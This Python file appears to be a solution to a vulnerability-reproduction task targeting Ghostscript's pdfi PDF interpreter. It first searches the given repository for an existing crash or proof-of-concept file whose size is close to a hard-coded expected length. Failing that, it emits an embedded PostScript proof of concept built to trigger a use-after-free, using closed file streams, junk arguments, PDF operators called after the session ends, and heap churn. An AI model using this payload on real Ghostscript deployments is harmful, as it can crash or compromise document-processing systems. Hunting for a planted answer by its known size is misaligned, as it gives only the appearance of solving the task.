import os
import re
from typing import Optional, Tuple


class Solution:
    def _read_file_bytes(self, path: str, limit: Optional[int] = None) -> Optional[bytes]:
        try:
            with open(path, 'rb') as f:
                if limit is None:
                    return f.read()
                return f.read(limit)
        except Exception:
            return None

    def _score_candidate(self, fullpath: str, size: int, target_len: int) -> float:
        # Base score components
        score = 0.0
        name = os.path.basename(fullpath).lower()
        ext = os.path.splitext(name)[1]

        # Prefer typical PoC names and relevant extensions
        keywords = [
            'poc', 'uaf', 'useafterfree', 'use-after-free', 'crash', 'testcase', 'repro',
            'ghost', 'gs', 'pdfi', 'pdf', 'ps', 'heap', 'sanitizer', 'asan'
        ]
        name_score = sum(1 for k in keywords if k in name)
        score += name_score * 5.0

        if ext in {'.pdf', '.ps', '.eps', '.ai', '.txt'}:
            score += 5.0
        if 'pdf' in name or 'ps' in name:
            score += 3.0

        # Prefer sizes near the ground-truth length
        score += 10.0 * (1.0 / (1.0 + abs(size - target_len)))

        # Content-based hints (lightweight to avoid big IO)
        content = self._read_file_bytes(fullpath, limit=65536)
        if content is not None:
            try:
                text = content.decode('latin-1', errors='ignore').lower()
            except Exception:
                text = ''
            # Indicators of PDF/PS and ghostscript internals
            text_hits = 0
            for token in [
                '%pdf', '%!ps', '%! adobe', 'runpdfbegin', 'pdfshowpage', 'pdfpagecount',
                'gs_', 'ghostscript', 'pdfi', '.pdf', 'runlibfile', 'pdf_main.ps'
            ]:
                if token in text:
                    text_hits += 1
            score += text_hits * 4.0

        return score

    def _search_repository_for_poc(self, root: str, target_len: int) -> Optional[bytes]:
        best: Tuple[float, str] = (-1e9, '')
        # Exclude obviously large or binary directories to save time
        exclude_dirs = {
            '.git', '.hg', '.svn', 'build', 'out', 'third_party', 'node_modules', '__pycache__',
            'bin', 'obj', 'dist', 'target'
        }
        for dirpath, dirnames, filenames in os.walk(root):
            # Prune directories
            dirnames[:] = [d for d in dirnames if d.lower() not in exclude_dirs]

            for fn in filenames:
                fullpath = os.path.join(dirpath, fn)
                try:
                    size = os.path.getsize(fullpath)
                except Exception:
                    continue
                # Consider files up to ~5MB
                if size < 1 or size > 5_000_000:
                    continue

                # Filter by likely extensions or names
                lower = fn.lower()
                ext = os.path.splitext(lower)[1]
                if not (ext in {'.pdf', '.ps', '.eps', '.txt', ''} or
                        any(k in lower for k in ('poc', 'crash', 'uaf', 'pdf', 'ps'))):
                    continue

                score = self._score_candidate(fullpath, size, target_len)
                if score > best[0]:
                    best = (score, fullpath)

        if best[1]:
            data = self._read_file_bytes(best[1])
            if data:
                return data
        return None

    def _fallback_postscript_poc(self) -> bytes:
        # PostScript PoC attempting to trigger Ghostscript pdfi UAF by:
        # 1) Loading PDF interpreter procs
        # 2) Intentionally failing to set input stream from PostScript
        # 3) Subsequently invoking PDF operators that access the input stream
        # 4) Repeating with various types to increase likelihood across versions
        ps = r"""
% Ghostscript pdfi stream UAF PoC (robust variant)
% Load PDF interpreter library if available
/systemdict /runlibfile known {
    { (pdf_main.ps) runlibfile } stopped pop
} if

% Helper to safely call a proc
/try {
  % stack: ... proc -> ...
  stopped pop
} bind def

% Amplify allocator churn to increase chance of UAF manifestation
/heap_churn {
  64 string
  0 1 1024 {
    pop
    1024 string pop
    2048 string pop
  } for
  pop
} bind def

% Procedure to try runpdfbegin with a given argument, then invoke PDF operators
/T {
  % stack: arg
  dup type /filetype eq {
    % Ensure the file is closed, to force a failure on using it as input stream.
    dup closefile
  } if
  % Attempt to begin PDF processing with invalid/broken "stream"
  { runpdfbegin } try

  % Try a bunch of PDF operators that would access the input stream
  { pdfpagecount pop } try
  { 1 pdfgetpage } try
  { 1 1 pdfshowpage } try
  { pdfshowpage } try
  { pdf_process_annot } try
  { pdf_fill_form } try
  { pdfdevbbox } try

  % Also try to end PDF session (free context) then touch again
  { runpdfend } try
  { pdfpagecount pop } try

  heap_churn
  pop
} bind def

% Prepare a variety of arguments of differing types
% including closed files, wrong types, and junk data
/args [
  null
  false
  true
  0
  1
  -1
  0.0
  1.5
  []
  [1 2 3]
  <<
    /Type /NotAStream
    /Length 0
  >>
  (nonexistent.pdf)
  (r)
  (w)
  ( )
  (%stdin)
  (%stdout)
  (%stderr)
] def

% Attempt with raw args
args {
  dup T
} forall

% Attempt with pairs (some runpdfbegin variants take two args)
/pairs [
  null null
  false true
  (nonexistent.pdf) (r)
  (nonexistent.pdf) (w)
  [] []
  <<>> (r)
  (r) <<>>
] def

0 2 pairs length 1 sub {
  /i exch def
  pairs i get
  pairs i 1 add get
  % Try both orderings
  { 2 copy runpdfbegin } try
  { pdfpagecount pop } try
  { runpdfend } try
  { pdfpagecount pop } try
  pop pop
  heap_churn
} for

% Create an actual file object and close it, then try using it
{
  (%pipe%/bin/true) (r) file dup closefile T
} try

% Another attempt with a standard device stream objects if available
systemdict /%stdin known {
  %stdin T
} if
systemdict /%stdout known {
  %stdout T
} if
systemdict /%stderr known {
  %stderr T
} if

% Directly try various PDF ops without any begin, to poke null/cleared context
{ pdfpagecount pop } try
{ 1 1 pdfshowpage } try
{ pdfshowpage } try
{ runpdfend } try

% Final churn and exit
heap_churn
quit
"""
        return ps.encode('latin-1')

    def solve(self, src_path: str) -> bytes:
        # Try to find an in-repo PoC near the ground-truth length first
        target_len = 13996
        if src_path and os.path.isdir(src_path):
            data = self._search_repository_for_poc(src_path, target_len)
            if data:
                return data

        # Fallback: generic PostScript PoC attempting to trigger the pdfi UAF
        return self._fallback_postscript_poc()